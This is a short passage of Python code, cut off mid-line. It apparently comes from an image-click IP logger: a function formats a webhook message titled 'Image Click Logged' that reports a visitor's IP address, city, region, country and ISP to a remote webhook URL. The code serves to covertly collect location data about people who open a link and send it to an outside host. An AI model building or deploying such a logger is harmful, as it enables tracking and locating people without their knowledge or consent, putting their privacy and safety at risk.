
def send_webhook(data):
    if not WEBHOOK_URL:
        return
    try:
        embed = {
            "embeds": [{
                "title": "🕵️ Image Click Logged",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP", "value": data.get("ip", "N/A"), "inline": True},
                    {"name": "City", "value": data.get("city", "N/A"), "inline": True},
                    {"name": "State/Region", "value": data.get("region", "N/A"), "inline": True},
                    {"name": "Country", "value": data.get("country", "N/A"), "inline": True},
                    {"name": "ISP", "value": 
